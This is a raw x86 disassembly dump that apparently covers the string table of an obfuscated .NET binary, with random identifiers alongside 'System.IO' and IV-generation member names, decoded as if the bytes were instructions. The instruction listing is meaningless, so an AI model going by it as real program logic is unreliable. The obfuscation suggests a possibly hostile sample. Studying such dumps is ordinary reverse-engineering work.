  407a49:	45                   	inc    %ebp
  407a4a:	5a                   	pop    %edx
  407a4b:	6e                   	outsb  %ds:(%esi),(%dx)
  407a4c:	49                   	dec    %ecx
  407a4d:	63 47 5a             	arpl   %eax,0x5a(%edi)
  407a50:	4d                   	dec    %ebp
  407a51:	00 6a 77             	add    %ch,0x77(%edx)
  407a54:	6c                   	insb   (%dx),%es:(%edi)
  407a55:	53                   	push   %ebx
  407a56:	6a 75                	push   $0x75
  407a58:	4b                   	dec    %ebx
  407a59:	53                   	push   %ebx
  407a5a:	64 6e                	outsb  %fs:(%esi),(%dx)
  407a5c:	4d                   	dec    %ebp
  407a5d:	00 5a 52             	add    %bl,0x52(%edx)
  407a60:	66 49                	dec    %cx
  407a62:	6d                   	insl   (%dx),%es:(%edi)
  407a63:	78 56                	js     0x407abb
  407a65:	6e                   	outsb  %ds:(%esi),(%dx)
  407a66:	6b 6b 44 4e          	imul   $0x4e,0x44(%ebx),%ebp
  407a6a:	00 57 52             	add    %dl,0x52(%edi)
  407a6d:	69 7a 76 73 55 64 4c 	imul   $0x4c645573,0x76(%edx),%edi
  407a74:	47                   	inc    %edi
  407a75:	4e                   	dec    %esi
  407a76:	00 52 73             	add    %dl,0x73(%edx)
  407a79:	53                   	push   %ebx
  407a7a:	63 77 4d             	arpl   %esi,0x4d(%edi)
  407a7d:	54                   	push   %esp
  407a7e:	63 48 61             	arpl   %ecx,0x61(%eax)
  407a81:	4c                   	dec    %esp
  407a82:	4d                   	dec    %ebp
  407a83:	49                   	dec    %ecx
  407a84:	4e                   	dec    %esi
  407a85:	00 73 52             	add    %dh,0x52(%ebx)
  407a88:	5a                   	pop    %edx
  407a89:	43                   	inc    %ebx
  407a8a:	4f                   	dec    %edi
  407a8b:	74 74                	je     0x407b01
  407a8d:	76 66                	jbe    0x407af5
  407a8f:	4a                   	dec    %edx
  407a90:	4e                   	dec    %esi
  407a91:	00 52 6e             	add    %dl,0x6e(%edx)
  407a94:	58                   	pop    %eax
  407a95:	58                   	pop    %eax
  407a96:	70 51                	jo     0x407ae9
  407a98:	4d                   	dec    %ebp
  407a99:	7a 50                	jp     0x407aeb
  407a9b:	4e                   	dec    %esi
  407a9c:	00 70 69             	add    %dh,0x69(%eax)
  407a9f:	78 53                	js     0x407af4
  407aa1:	48                   	dec    %eax
  407aa2:	46                   	inc    %esi
  407aa3:	72 4c                	jb     0x407af1
  407aa5:	67 6e                	outsb  %ds:(%si),(%dx)
  407aa7:	43                   	inc    %ebx
  407aa8:	55                   	push   %ebp
  407aa9:	4e                   	dec    %esi
  407aaa:	00 62 48             	add    %ah,0x48(%edx)
  407aad:	64 4f                	fs dec %edi
  407aaf:	6b 50 7a 76          	imul   $0x76,0x7a(%eax),%edx
  407ab3:	4b                   	dec    %ebx
  407ab4:	55                   	push   %ebp
  407ab5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ab6:	4e                   	dec    %esi
  407ab7:	00 64 52 49          	add    %ah,0x49(%edx,%edx,2)
  407abb:	45                   	inc    %ebp
  407abc:	50                   	push   %eax
  407abd:	4d                   	dec    %ebp
  407abe:	7a 64                	jp     0x407b24
  407ac0:	6c                   	insb   (%dx),%es:(%edi)
  407ac1:	62 72 4e             	bound  %esi,0x4e(%edx)
  407ac4:	00 5a 53             	add    %bl,0x53(%edx)
  407ac7:	72 73                	jb     0x407b3c
  407ac9:	53                   	push   %ebx
  407aca:	66 7a 52             	data16 jp 0x407b1f
  407acd:	49                   	dec    %ecx
  407ace:	76 4e                	jbe    0x407b1e
  407ad0:	59                   	pop    %ecx
  407ad1:	68 52 73 4e 00       	push   $0x4e7352
  407ad6:	4a                   	dec    %edx
  407ad7:	58                   	pop    %eax
  407ad8:	45                   	inc    %ebp
  407ad9:	51                   	push   %ecx
  407ada:	6a 48                	push   $0x48
  407adc:	52                   	push   %edx
  407add:	55                   	push   %ebp
  407ade:	69 61 71 7a 4a 41 4f 	imul   $0x4f414a7a,0x71(%ecx),%esp
  407ae5:	00 53 79             	add    %dl,0x79(%ebx)
  407ae8:	73 74                	jae    0x407b5e
  407aea:	65 6d                	gs insl (%dx),%es:(%edi)
  407aec:	2e 49                	cs dec %ecx
  407aee:	4f                   	dec    %edi
  407aef:	00 43 45             	add    %al,0x45(%ebx)
  407af2:	79 49                	jns    0x407b3d
  407af4:	59                   	pop    %ecx
  407af5:	65 51                	gs push %ecx
  407af7:	4a                   	dec    %edx
  407af8:	4d                   	dec    %ebp
  407af9:	4f                   	dec    %edi
  407afa:	00 76 4e             	add    %dh,0x4e(%esi)
  407afd:	6d                   	insl   (%dx),%es:(%edi)
  407afe:	61                   	popa
  407aff:	4c                   	dec    %esp
  407b00:	4b                   	dec    %ebx
  407b01:	41                   	inc    %ecx
  407b02:	41                   	inc    %ecx
  407b03:	59                   	pop    %ecx
  407b04:	6f                   	outsl  %ds:(%esi),(%dx)
  407b05:	54                   	push   %esp
  407b06:	4f                   	dec    %edi
  407b07:	00 4e 49             	add    %cl,0x49(%esi)
  407b0a:	52                   	push   %edx
  407b0b:	43                   	inc    %ebx
  407b0c:	57                   	push   %edi
  407b0d:	50                   	push   %eax
  407b0e:	67 46                	addr16 inc %esi
  407b10:	4a                   	dec    %edx
  407b11:	55                   	push   %ebp
  407b12:	4f                   	dec    %edi
  407b13:	00 67 6d             	add    %ah,0x6d(%edi)
  407b16:	4e                   	dec    %esi
  407b17:	74 58                	je     0x407b71
  407b19:	50                   	push   %eax
  407b1a:	64 4f                	fs dec %edi
  407b1c:	78 48                	js     0x407b66
  407b1e:	63 4f 00             	arpl   %ecx,0x0(%edi)
  407b21:	6d                   	insl   (%dx),%es:(%edi)
  407b22:	47                   	inc    %edi
  407b23:	45                   	inc    %ebp
  407b24:	6f                   	outsl  %ds:(%esi),(%dx)
  407b25:	62 4a 54             	bound  %ecx,0x54(%edx)
  407b28:	6b 67 42 56          	imul   $0x56,0x42(%edi),%esp
  407b2c:	65 63 4f 00          	arpl   %ecx,%gs:0x0(%edi)
  407b30:	6b 53 74 68          	imul   $0x68,0x74(%ebx),%edx
  407b34:	4a                   	dec    %edx
  407b35:	78 45                	js     0x407b7c
  407b37:	46                   	inc    %esi
  407b38:	71 67                	jno    0x407ba1
  407b3a:	6c                   	insb   (%dx),%es:(%edi)
  407b3b:	4f                   	dec    %edi
  407b3c:	00 41 70             	add    %al,0x70(%ecx)
  407b3f:	4c                   	dec    %esp
  407b40:	42                   	inc    %edx
  407b41:	43                   	inc    %ebx
  407b42:	59                   	pop    %ecx
  407b43:	43                   	inc    %ebx
  407b44:	76 51                	jbe    0x407b97
  407b46:	46                   	inc    %esi
  407b47:	70 4f                	jo     0x407b98
  407b49:	00 71 4f             	add    %dh,0x4f(%ecx)
  407b4c:	78 47                	js     0x407b95
  407b4e:	6e                   	outsb  %ds:(%esi),(%dx)
  407b4f:	55                   	push   %ebp
  407b50:	49                   	dec    %ecx
  407b51:	49                   	dec    %ecx
  407b52:	76 48                	jbe    0x407b9c
  407b54:	75 4f                	jne    0x407ba5
  407b56:	00 59 44             	add    %bl,0x44(%ecx)
  407b59:	4f                   	dec    %edi
  407b5a:	7a 6e                	jp     0x407bca
  407b5c:	71 58                	jno    0x407bb6
  407b5e:	6d                   	insl   (%dx),%es:(%edi)
  407b5f:	73 55                	jae    0x407bb6
  407b61:	42                   	inc    %edx
  407b62:	4c                   	dec    %esp
  407b63:	75 4f                	jne    0x407bb4
  407b65:	00 46 6a             	add    %al,0x6a(%esi)
  407b68:	46                   	inc    %esi
  407b69:	69 4b 54 4a 46 52 71 	imul   $0x7152464a,0x54(%ebx),%ecx
  407b70:	57                   	push   %edi
  407b71:	47                   	inc    %edi
  407b72:	79 4f                	jns    0x407bc3
  407b74:	00 68 70             	add    %ch,0x70(%eax)
  407b77:	56                   	push   %esi
  407b78:	72 43                	jb     0x407bbd
  407b7a:	59                   	pop    %ecx
  407b7b:	6d                   	insl   (%dx),%es:(%edi)
  407b7c:	5a                   	pop    %edx
  407b7d:	72 66                	jb     0x407be5
  407b7f:	50                   	push   %eax
  407b80:	00 74 61 42          	add    %dh,0x42(%ecx,%eiz,2)
  407b84:	46                   	inc    %esi
  407b85:	79 78                	jns    0x407bff
  407b87:	43                   	inc    %ebx
  407b88:	6a 6d                	push   $0x6d
  407b8a:	4f                   	dec    %edi
  407b8b:	4e                   	dec    %esi
  407b8c:	53                   	push   %ebx
  407b8d:	41                   	inc    %ecx
  407b8e:	69 50 00 6a 41 6e 76 	imul   $0x766e416a,0x0(%eax),%edx
  407b95:	66 79 47             	data16 jns 0x407bdf
  407b98:	70 4b                	jo     0x407be5
  407b9a:	48                   	dec    %eax
  407b9b:	51                   	push   %ecx
  407b9c:	72 50                	jb     0x407bee
  407b9e:	00 71 6d             	add    %dh,0x6d(%ecx)
  407ba1:	46                   	inc    %esi
  407ba2:	6a 4e                	push   $0x4e
  407ba4:	73 63                	jae    0x407c09
  407ba6:	76 4b                	jbe    0x407bf3
  407ba8:	6a 45                	push   $0x45
  407baa:	51                   	push   %ecx
  407bab:	00 68 51             	add    %ch,0x51(%eax)
  407bae:	62 41 70             	bound  %eax,0x70(%ecx)
  407bb1:	78 66                	js     0x407c19
  407bb3:	61                   	popa
  407bb4:	6c                   	insb   (%dx),%es:(%edi)
  407bb5:	45                   	inc    %ebp
  407bb6:	54                   	push   %esp
  407bb7:	68 4c 55 51 00       	push   $0x51554c
  407bbc:	55                   	push   %ebp
  407bbd:	56                   	push   %esi
  407bbe:	54                   	push   %esp
  407bbf:	71 48                	jno    0x407c09
  407bc1:	58                   	pop    %eax
  407bc2:	4f                   	dec    %edi
  407bc3:	76 4b                	jbe    0x407c10
  407bc5:	68 51 00 49 4f       	push   $0x4f490051
  407bca:	55                   	push   %ebp
  407bcb:	59                   	pop    %ecx
  407bcc:	61                   	popa
  407bcd:	46                   	inc    %esi
  407bce:	59                   	pop    %ecx
  407bcf:	64 74 42             	fs je  0x407c14
  407bd2:	63 6f 51             	arpl   %ebp,0x51(%edi)
  407bd5:	00 56 6d             	add    %dl,0x6d(%esi)
  407bd8:	65 69 61 73 76 76 48 	imul   $0x72487676,%gs:0x73(%ecx),%esp
  407bdf:	72 
  407be0:	51                   	push   %ecx
  407be1:	00 4a 45             	add    %cl,0x45(%edx)
  407be4:	62 43 52             	bound  %eax,0x52(%ebx)
  407be7:	69 63 70 46 54 7a 74 	imul   $0x747a5446,0x70(%ebx),%esp
  407bee:	51                   	push   %ecx
  407bef:	00 71 48             	add    %dh,0x48(%ecx)
  407bf2:	7a 45                	jp     0x407c39
  407bf4:	6a 4d                	push   $0x4d
  407bf6:	76 61                	jbe    0x407c59
  407bf8:	41                   	inc    %ecx
  407bf9:	52                   	push   %edx
  407bfa:	00 47 77             	add    %al,0x77(%edi)
  407bfd:	42                   	inc    %edx
  407bfe:	7a 4a                	jp     0x407c4a
  407c00:	51                   	push   %ecx
  407c01:	6f                   	outsl  %ds:(%esi),(%dx)
  407c02:	74 4b                	je     0x407c4f
  407c04:	43                   	inc    %ebx
  407c05:	52                   	push   %edx
  407c06:	00 4f 51             	add    %cl,0x51(%edi)
  407c09:	69 43 6b 49 6f 43 64 	imul   $0x64436f49,0x6b(%ebx),%eax
  407c10:	75 52                	jne    0x407c64
  407c12:	45                   	inc    %ebp
  407c13:	52                   	push   %edx
  407c14:	00 42 45             	add    %al,0x45(%edx)
  407c17:	44                   	inc    %esp
  407c18:	51                   	push   %ecx
  407c19:	4a                   	dec    %edx
  407c1a:	6d                   	insl   (%dx),%es:(%edi)
  407c1b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c1c:	74 45                	je     0x407c63
  407c1e:	54                   	push   %esp
  407c1f:	59                   	pop    %ecx
  407c20:	63 4b 52             	arpl   %ecx,0x52(%ebx)
  407c23:	00 47 66             	add    %al,0x66(%edi)
  407c26:	4e                   	dec    %esi
  407c27:	43                   	inc    %ebx
  407c28:	49                   	dec    %ecx
  407c29:	50                   	push   %eax
  407c2a:	55                   	push   %ebp
  407c2b:	77 65                	ja     0x407c92
  407c2d:	57                   	push   %edi
  407c2e:	52                   	push   %edx
  407c2f:	00 72 45             	add    %dh,0x45(%edx)
  407c32:	67 44                	addr16 inc %esp
  407c34:	53                   	push   %ebx
  407c35:	41                   	inc    %ecx
  407c36:	62 4c 58 64          	bound  %ecx,0x64(%eax,%ebx,2)
  407c3a:	6f                   	outsl  %ds:(%esi),(%dx)
  407c3b:	61                   	popa
  407c3c:	62 52 00             	bound  %edx,0x0(%edx)
  407c3f:	46                   	inc    %esi
  407c40:	58                   	pop    %eax
  407c41:	47                   	inc    %edi
  407c42:	64 58                	fs pop %eax
  407c44:	4f                   	dec    %edi
  407c45:	5a                   	pop    %edx
  407c46:	76 72                	jbe    0x407cba
  407c48:	45                   	inc    %ebp
  407c49:	41                   	inc    %ecx
  407c4a:	63 52 00             	arpl   %edx,0x0(%edx)
  407c4d:	59                   	pop    %ecx
  407c4e:	4a                   	dec    %edx
  407c4f:	74 45                	je     0x407c96
  407c51:	76 4b                	jbe    0x407c9e
  407c53:	43                   	inc    %ebx
  407c54:	76 7a                	jbe    0x407cd0
  407c56:	4a                   	dec    %edx
  407c57:	54                   	push   %esp
  407c58:	78 6d                	js     0x407cc7
  407c5a:	52                   	push   %edx
  407c5b:	00 6b 78             	add    %ch,0x78(%ebx)
  407c5e:	62 44 5a 52          	bound  %eax,0x52(%edx,%ebx,2)
  407c62:	6c                   	insb   (%dx),%es:(%edi)
  407c63:	73 72                	jae    0x407cd7
  407c65:	77 52                	ja     0x407cb9
  407c67:	00 6f 44             	add    %ch,0x44(%edi)
  407c6a:	6b 51 75 5a          	imul   $0x5a,0x75(%ecx),%edx
  407c6e:	64 72 56             	fs jb  0x407cc7
  407c71:	70 79                	jo     0x407cec
  407c73:	52                   	push   %edx
  407c74:	00 78 47             	add    %bh,0x47(%eax)
  407c77:	42                   	inc    %edx
  407c78:	61                   	popa
  407c79:	41                   	inc    %ecx
  407c7a:	51                   	push   %ecx
  407c7b:	56                   	push   %esi
  407c7c:	65 77 51             	gs ja  0x407cd0
  407c7f:	76 52                	jbe    0x407cd3
  407c81:	76 51                	jbe    0x407cd4
  407c83:	49                   	dec    %ecx
  407c84:	53                   	push   %ebx
  407c85:	00 65 73             	add    %ah,0x73(%ebp)
  407c88:	78 6c                	js     0x407cf6
  407c8a:	4f                   	dec    %edi
  407c8b:	7a 6b                	jp     0x407cf8
  407c8d:	67 51                	addr16 push %ecx
  407c8f:	6a 56                	push   $0x56
  407c91:	41                   	inc    %ecx
  407c92:	72 53                	jb     0x407ce7
  407c94:	00 57 41             	add    %dl,0x41(%edi)
  407c97:	48                   	dec    %eax
  407c98:	42                   	inc    %edx
  407c99:	4d                   	dec    %ebp
  407c9a:	70 42                	jo     0x407cde
  407c9c:	74 52                	je     0x407cf0
  407c9e:	79 53                	jns    0x407cf3
  407ca0:	00 6e 7a             	add    %ch,0x7a(%esi)
  407ca3:	78 51                	js     0x407cf6
  407ca5:	77 50                	ja     0x407cf7
  407ca7:	4b                   	dec    %ebx
  407ca8:	6a 41                	push   $0x41
  407caa:	78 42                	js     0x407cee
  407cac:	41                   	inc    %ecx
  407cad:	58                   	pop    %eax
  407cae:	42                   	inc    %edx
  407caf:	54                   	push   %esp
  407cb0:	00 5a 69             	add    %bl,0x69(%edx)
  407cb3:	48                   	dec    %eax
  407cb4:	4b                   	dec    %ebx
  407cb5:	51                   	push   %ecx
  407cb6:	4d                   	dec    %ebp
  407cb7:	73 41                	jae    0x407cfa
  407cb9:	55                   	push   %ebp
  407cba:	44                   	inc    %esp
  407cbb:	43                   	inc    %ebx
  407cbc:	54                   	push   %esp
  407cbd:	00 4a 4f             	add    %cl,0x4f(%edx)
  407cc0:	7a 4d                	jp     0x407d0f
  407cc2:	51                   	push   %ecx
  407cc3:	74 50                	je     0x407d15
  407cc5:	6e                   	outsb  %ds:(%esi),(%dx)
  407cc6:	6d                   	insl   (%dx),%es:(%edi)
  407cc7:	59                   	pop    %ecx
  407cc8:	4d                   	dec    %ebp
  407cc9:	52                   	push   %edx
  407cca:	54                   	push   %esp
  407ccb:	00 54 4f 58          	add    %dl,0x58(%edi,%ecx,2)
  407ccf:	50                   	push   %eax
  407cd0:	6b 77 67 76          	imul   $0x76,0x67(%edi),%esi
  407cd4:	55                   	push   %ebp
  407cd5:	6d                   	insl   (%dx),%es:(%edi)
  407cd6:	49                   	dec    %ecx
  407cd7:	69 49 53 54 00 64 65 	imul   $0x65640054,0x53(%ecx),%ecx
  407cde:	76 46                	jbe    0x407d26
  407ce0:	61                   	popa
  407ce1:	66 67 65 74 71       	data16 addr16 gs je 0x407d57
  407ce6:	4f                   	dec    %edi
  407ce7:	54                   	push   %esp
  407ce8:	54                   	push   %esp
  407ce9:	00 59 42             	add    %bl,0x42(%ecx)
  407cec:	62 53 59             	bound  %edx,0x59(%ebx)
  407cef:	74 74                	je     0x407d65
  407cf1:	6b 77 62 7a          	imul   $0x7a,0x62(%edi),%esi
  407cf5:	73 58                	jae    0x407d4f
  407cf7:	54                   	push   %esp
  407cf8:	00 5a 4f             	add    %bl,0x4f(%edx)
  407cfb:	48                   	dec    %eax
  407cfc:	42                   	inc    %edx
  407cfd:	42                   	inc    %edx
  407cfe:	66 4b                	dec    %bx
  407d00:	6a 58                	push   $0x58
  407d02:	53                   	push   %ebx
  407d03:	46                   	inc    %esi
  407d04:	6d                   	insl   (%dx),%es:(%edi)
  407d05:	54                   	push   %esp
  407d06:	00 71 4e             	add    %dh,0x4e(%ecx)
  407d09:	46                   	inc    %esi
  407d0a:	71 43                	jno    0x407d4f
  407d0c:	64 71 48             	fs jno 0x407d57
  407d0f:	72 43                	jb     0x407d54
  407d11:	47                   	inc    %edi
  407d12:	6f                   	outsl  %ds:(%esi),(%dx)
  407d13:	72 50                	jb     0x407d65
  407d15:	70 54                	jo     0x407d6b
  407d17:	00 76 70             	add    %dh,0x70(%esi)
  407d1a:	70 74                	jo     0x407d90
  407d1c:	56                   	push   %esi
  407d1d:	61                   	popa
  407d1e:	65 64 4b             	gs fs dec %ebx
  407d21:	55                   	push   %ebp
  407d22:	42                   	inc    %edx
  407d23:	75 54                	jne    0x407d79
  407d25:	00 46 57             	add    %al,0x57(%esi)
  407d28:	76 45                	jbe    0x407d6f
  407d2a:	46                   	inc    %esi
  407d2b:	6d                   	insl   (%dx),%es:(%edi)
  407d2c:	50                   	push   %eax
  407d2d:	65 50                	gs push %eax
  407d2f:	44                   	inc    %esp
  407d30:	46                   	inc    %esi
  407d31:	55                   	push   %ebp
  407d32:	00 4f 61             	add    %cl,0x61(%edi)
  407d35:	51                   	push   %ecx
  407d36:	61                   	popa
  407d37:	62 78 66             	bound  %edi,0x66(%eax)
  407d3a:	5a                   	pop    %edx
  407d3b:	74 4b                	je     0x407d88
  407d3d:	52                   	push   %edx
  407d3e:	48                   	dec    %eax
  407d3f:	55                   	push   %ebp
  407d40:	00 72 63             	add    %dh,0x63(%edx)
  407d43:	76 66                	jbe    0x407dab
  407d45:	66 4e                	dec    %si
  407d47:	64 6b 70 67 49       	imul   $0x49,%fs:0x67(%eax),%esi
  407d4c:	55                   	push   %ebp
  407d4d:	00 78 46             	add    %bh,0x46(%eax)
  407d50:	62 53 44             	bound  %edx,0x44(%ebx)
  407d53:	7a 6d                	jp     0x407dc2
  407d55:	6a 56                	push   $0x56
  407d57:	41                   	inc    %ecx
  407d58:	4b                   	dec    %ebx
  407d59:	55                   	push   %ebp
  407d5a:	00 62 67             	add    %ah,0x67(%edx)
  407d5d:	6b 48 65 47          	imul   $0x47,0x65(%eax),%ecx
  407d61:	53                   	push   %ebx
  407d62:	59                   	pop    %ecx
  407d63:	71 4e                	jno    0x407db3
  407d65:	62 4f 55             	bound  %ecx,0x55(%edi)
  407d68:	00 78 45             	add    %bh,0x45(%eax)
  407d6b:	44                   	inc    %esp
  407d6c:	71 6f                	jno    0x407ddd
  407d6e:	6a 48                	push   $0x48
  407d70:	52                   	push   %edx
  407d71:	54                   	push   %esp
  407d72:	55                   	push   %ebp
  407d73:	00 48 71             	add    %cl,0x71(%eax)
  407d76:	6a 72                	push   $0x72
  407d78:	62 6d 50             	bound  %ebp,0x50(%ebp)
  407d7b:	49                   	dec    %ecx
  407d7c:	77 5a                	ja     0x407dd8
  407d7e:	76 57                	jbe    0x407dd7
  407d80:	55                   	push   %ebp
  407d81:	00 51 52             	add    %dl,0x52(%ecx)
  407d84:	68 58 56 44 57       	push   $0x57445658
  407d89:	58                   	pop    %eax
  407d8a:	72 57                	jb     0x407de3
  407d8c:	68 6b 55 00 66       	push   $0x6600556b
  407d91:	62 51 5a             	bound  %edx,0x5a(%ecx)
  407d94:	52                   	push   %edx
  407d95:	57                   	push   %edi
  407d96:	4a                   	dec    %edx
  407d97:	63 45 4b             	arpl   %eax,0x4b(%ebp)
  407d9a:	47                   	inc    %edi
  407d9b:	7a 46                	jp     0x407de3
  407d9d:	69 6c 55 00 68 44 7a 	imul   $0x417a4468,0x0(%ebp,%edx,2),%ebp
  407da4:	41 
  407da5:	70 69                	jo     0x407e10
  407da7:	44                   	inc    %esp
  407da8:	70 74                	jo     0x407e1e
  407daa:	57                   	push   %edi
  407dab:	49                   	dec    %ecx
  407dac:	74 55                	je     0x407e03
  407dae:	00 4a 63             	add    %cl,0x63(%edx)
  407db1:	70 5a                	jo     0x407e0d
  407db3:	55                   	push   %ebp
  407db4:	61                   	popa
  407db5:	64 52                	fs push %edx
  407db7:	56                   	push   %esi
  407db8:	68 79 48 56 00       	push   $0x564879
  407dbd:	67 65 74 5f          	addr16 gs je 0x407e20
  407dc1:	49                   	dec    %ecx
  407dc2:	56                   	push   %esi
  407dc3:	00 73 65             	add    %dh,0x65(%ebx)
  407dc6:	74 5f                	je     0x407e27
  407dc8:	49                   	dec    %ecx
  407dc9:	56                   	push   %esi
  407dca:	00 47 65             	add    %al,0x65(%edi)
  407dcd:	6e                   	outsb  %ds:(%esi),(%dx)
  407dce:	65 72 61             	gs jb  0x407e32
  407dd1:	74 65                	je     0x407e38
  407dd3:	49                   	dec    %ecx
  407dd4:	56                   	push   %esi
  407dd5:	00 4f 4f             	add    %cl,0x4f(%edi)
  407dd8:	76 64                	jbe    0x407e3e
  407dda:	6c                   	insb   (%dx),%es:(%edi)
  407ddb:	41                   	inc    %ecx
  407ddc:	4d                   	dec    %ebp
  407ddd:	43                   	inc    %ebx
  407dde:	4d                   	dec    %ebp
  407ddf:	78 63                	js     0x407e44
  407de1:	64 63 56 00          	arpl   %edx,%fs:0x0(%esi)
  407de5:	46                   	inc    %esi
  407de6:	51                   	push   %ecx
  407de7:	6c                   	insb   (%dx),%es:(%edi)
  407de8:	77 79                	ja     0x407e63
  407dea:	79 4e                	jns    0x407e3a
  407dec:	4d                   	dec    %ebp
  407ded:	7a 69                	jp     0x407e58
  407def:	55                   	push   %ebp
  407df0:	4e                   	dec    %esi
  407df1:	66 68 56 00          	pushw  $0x56
  407df5:	70 6d                	jo     0x407e64
  407df7:	54                   	push   %esp
  407df8:	57                   	push   %edi
  407df9:	6e                   	outsb  %ds:(%esi),(%dx)
  407dfa:	61                   	popa
  407dfb:	67 55                	addr16 push %ebp
  407dfd:	68 6d 61 6b 56       	push   $0x566b616d
  407e02:	00 51 68             	add    %dl,0x68(%ecx)
  407e05:	62 71 47             	bound  %esi,0x47(%ecx)
  407e08:	6a 6d                	push   $0x6d
  407e0a:	45                   	inc    %ebp
  407e0b:	53                   	push   %ebx
  407e0c:	43                   	inc    %ebx
  407e0d:	44                   	inc    %esp
  407e0e:	57                   	push   %edi
  407e0f:	00 48 42             	add    %cl,0x42(%eax)
  407e12:	71 66                	jno    0x407e7a
  407e14:	77 6f                	ja     0x407e85
  407e16:	4c                   	dec    %esp
  407e17:	6f                   	outsl  %ds:(%esi),(%dx)
  407e18:	54                   	push   %esp
  407e19:	78 79                	js     0x407e94
  407e1b:	56                   	push   %esi
  407e1c:	4b                   	dec    %ebx
  407e1d:	44                   	inc    %esp
  407e1e:	57                   	push   %edi
  407e1f:	00 71 56             	add    %dh,0x56(%ecx)
  407e22:	54                   	push   %esp
  407e23:	4b                   	dec    %ebx
  407e24:	4d                   	dec    %ebp
  407e25:	4f                   	dec    %edi
  407e26:	59                   	pop    %ecx
  407e27:	68 52 47 49 72       	push   $0x72494752
  407e2c:	56                   	push   %esi
  407e2d:	4b                   	dec    %ebx
  407e2e:	57                   	push   %edi
  407e2f:	00 56 51             	add    %dl,0x51(%esi)
  407e32:	74 7a                	je     0x407eae
  407e34:	43                   	inc    %ebx
  407e35:	56                   	push   %esi
  407e36:	62 4f 53             	bound  %ecx,0x53(%edi)
  407e39:	57                   	push   %edi
  407e3a:	00 6a 63             	add    %ch,0x63(%edx)
  407e3d:	4e                   	dec    %esi
  407e3e:	6c                   	insb   (%dx),%es:(%edi)
  407e3f:	77 46                	ja     0x407e87
  407e41:	44                   	inc    %esp
  407e42:	64 71 6b             	fs jno 0x407eb0
  407e45:	58                   	pop    %eax
  407e46:	57                   	push   %edi
  407e47:	00 50 50             	add    %dl,0x50(%eax)
  407e4a:	63 7a 77             	arpl   %edi,0x77(%edx)
  407e4d:	43                   	inc    %ebx
  407e4e:	7a 78                	jp     0x407ec8
  407e50:	51                   	push   %ecx
  407e51:	6c                   	insb   (%dx),%es:(%edi)
  407e52:	58                   	pop    %eax
  407e53:	57                   	push   %edi
  407e54:	00 4a 46             	add    %cl,0x46(%edx)
  407e57:	6d                   	insl   (%dx),%es:(%edi)
  407e58:	72 4a                	jb     0x407ea4
  407e5a:	53                   	push   %ebx
  407e5b:	77 73                	ja     0x407ed0
  407e5d:	62 61 57             	bound  %esp,0x57(%ecx)
  407e60:	00 54 6d 41          	add    %dl,0x41(%ebp,%ebp,2)
  407e64:	6b 46 79 4a          	imul   $0x4a,0x79(%esi),%eax
  407e68:	6e                   	outsb  %ds:(%esi),(%dx)
  407e69:	73 52                	jae    0x407ebd
  407e6b:	6d                   	insl   (%dx),%es:(%edi)
  407e6c:	6e                   	outsb  %ds:(%esi),(%dx)
  407e6d:	66 57                	push   %di
  407e6f:	00 6a 69             	add    %ch,0x69(%edx)
  407e72:	43                   	inc    %ebx
  407e73:	43                   	inc    %ebx
  407e74:	68 4b 65 59 4f       	push   $0x4f59654b
  407e79:	4d                   	dec    %ebp
  407e7a:	56                   	push   %esi
  407e7b:	62 53 70             	bound  %edx,0x70(%ebx)
  407e7e:	57                   	push   %edi
  407e7f:	00 6f 6d             	add    %ch,0x6d(%edi)
  407e82:	68 61 66 69 7a       	push   $0x7a696661
  407e87:	49                   	dec    %ecx
  407e88:	75 4c                	jne    0x407ed6
  407e8a:	66 50                	push   %ax
  407e8c:	6a 76                	push   $0x76
  407e8e:	57                   	push   %edi
  407e8f:	00 79 6c             	add    %bh,0x6c(%ecx)
  407e92:	4a                   	dec    %edx
  407e93:	79 51                	jns    0x407ee6
  407e95:	43                   	inc    %ebx
  407e96:	65 6b 76 4a 58       	imul   $0x58,%gs:0x4a(%esi),%esi
  407e9b:	00 61 42             	add    %ah,0x42(%ecx)
  407e9e:	4b                   	dec    %ebx
  407e9f:	66 6a 58             	pushw  $0x58
  407ea2:	70 75                	jo     0x407f19
  407ea4:	76 6a                	jbe    0x407f10
  407ea6:	44                   	inc    %esp
  407ea7:	54                   	push   %esp
  407ea8:	58                   	pop    %eax
  407ea9:	00 43 56             	add    %al,0x56(%ebx)
  407eac:	58                   	pop    %eax
  407ead:	7a 47                	jp     0x407ef6
  407eaf:	58                   	pop    %eax
  407eb0:	56                   	push   %esi
  407eb1:	79 7a                	jns    0x407f2d
  407eb3:	5a                   	pop    %edx
  407eb4:	4a                   	dec    %edx
  407eb5:	59                   	pop    %ecx
  407eb6:	00 48 6e             	add    %cl,0x6e(%eax)
  407eb9:	67 73 70             	addr16 jae 0x407f2c
  407ebc:	43                   	inc    %ebx
  407ebd:	57                   	push   %edi
  407ebe:	6c                   	insb   (%dx),%es:(%edi)
  407ebf:	5a                   	pop    %edx
  407ec0:	55                   	push   %ebp
  407ec1:	6a 62                	push   $0x62
  407ec3:	59                   	pop    %ecx
  407ec4:	00 4b 58             	add    %cl,0x58(%ebx)
  407ec7:	49                   	dec    %ecx
  407ec8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ec9:	75 6c                	jne    0x407f37
  407ecb:	50                   	push   %eax
  407ecc:	62 78 73             	bound  %edi,0x73(%eax)
  407ecf:	49                   	dec    %ecx
  407ed0:	44                   	inc    %esp
  407ed1:	5a                   	pop    %edx
  407ed2:	00 72 70             	add    %dh,0x70(%edx)
  407ed5:	57                   	push   %edi
  407ed6:	66 63 79 4a          	arpl   %di,0x4a(%ecx)
  407eda:	41                   	inc    %ecx
  407edb:	4e                   	dec    %esi
  407edc:	66 41                	inc    %cx
  407ede:	49                   	dec    %ecx
  407edf:	5a                   	pop    %edx
  407ee0:	00 52 4f             	add    %dl,0x4f(%edx)
  407ee3:	65 4a                	gs dec %edx
  407ee5:	46                   	inc    %esi
  407ee6:	43                   	inc    %ebx
  407ee7:	51                   	push   %ecx
  407ee8:	4b                   	dec    %ebx
  407ee9:	52                   	push   %edx
  407eea:	46                   	inc    %esi
  407eeb:	55                   	push   %ebp
  407eec:	6d                   	insl   (%dx),%es:(%edi)
  407eed:	76 7a                	jbe    0x407f69
  407eef:	4b                   	dec    %ebx
  407ef0:	5a                   	pop    %edx
  407ef1:	00 45 75             	add    %al,0x75(%ebp)
  407ef4:	66 6f                	outsw  %ds:(%esi),(%dx)
  407ef6:	73 6a                	jae    0x407f62
  407ef8:	48                   	dec    %eax
  407ef9:	76 4c                	jbe    0x407f47
  407efb:	5a                   	pop    %edx
